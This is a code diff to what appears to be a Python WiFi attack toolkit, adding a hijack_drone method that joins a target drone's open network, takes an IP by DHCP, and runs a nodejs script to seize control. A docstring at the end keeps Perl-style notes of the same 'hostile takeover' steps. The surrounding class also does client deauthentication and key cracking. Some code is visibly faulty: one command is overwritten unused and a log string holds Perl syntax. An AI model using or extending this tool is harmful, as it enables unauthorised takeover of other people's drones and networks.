@@ -12,11 +12,13 @@
 ##############################################################################
 
 
+from ctypes.wintypes import MSG
 import pandas
 
 from . wifi_nw_tools import *
 from ..config import *
 from .wifi_vendors import *
+from ..drone import drone as d
 
 
 class WifiAttacker():
@@ -91,10 +93,6 @@ class WifiAttacker():
         start_mon(chan, interface)
         dump_specific_nw(bssid, chan, MON_INTERF, duration)
         restore_interf(interface)
-        
-    
-    def crack_key(self) -> None:
-        pass
 
 
     def deauth_client(self, ap_bssid, cli_bssid, chan, essid
@@ -223,6 +221,69 @@ class WifiAttacker():
 
         # pre-shared key cracking
         crack(ap_bssid, essid)
+
+    
+    def hijack_drone(self, targeted_drone:d.Drone):
+        
+        """
+        Attempt to connect to a target
+        """
+        cmd = ["sudo", "iwconfig", MNG_INTERF, "essid"
+            , targeted_drone.get_channel()]
+
+        cmd = ["sudo", "nmcli", "d", "wifi", "connect"
+            , targeted_drone.get_ssid(), "password", ""]
+
+        progress = log.progress(
+            "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n")
+        try:
+            subprocess.run(cmd, capture_output=False)
+        except Exception as e:
+            progress .failure("\nError while trying to connect to target: ", format(e))
+            raise(e)
+        progress.success()
+
+       
+        """
+        Attempt to acquire an IP adress from the target
+        """
+        cmd = ['sudo', 'dhclient', "-v", MNG_INTERF]
+        progress = log.progress(
+            "\n\nAcquiring IP adress from the target...\n")
+        try:
+            subprocess.run(cmd, capture_output=False)
+        except Exception as e:
+            progress .failure("\nError while trying to acquire IP from the target: ", format(e))
+            raise(e)
+        progress.success()
+
+
+
+        """
+        Attempt to hijack a drone (while already connected to it)
+        """
+        cmd = ['sudo', 'nodejs', BASE_DIR+"src/drone/drone_hijack.js"]
+        progress = log.progress(
+            "\n\nHijacking the drone...\n")
+        try:
+            subprocess.run(cmd, capture_output=False)
+        except Exception as e:
+            progress .failure("\nError while trying to hijack the drone: ", format(e))
+            raise(e)
+        progress.success()
+        
+        input("\nPress enter to quit")
+
+
+        """
+        sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
+
+        print "Acquiring IP from drone for hostile takeover\n";
+        sudo($dhclient, "-v", $interface2);
+
+        print "\n\nTAKING OVER DRONE\n";
+        sudo($nodejs, $controljs);
+        """
 
 
 def main():
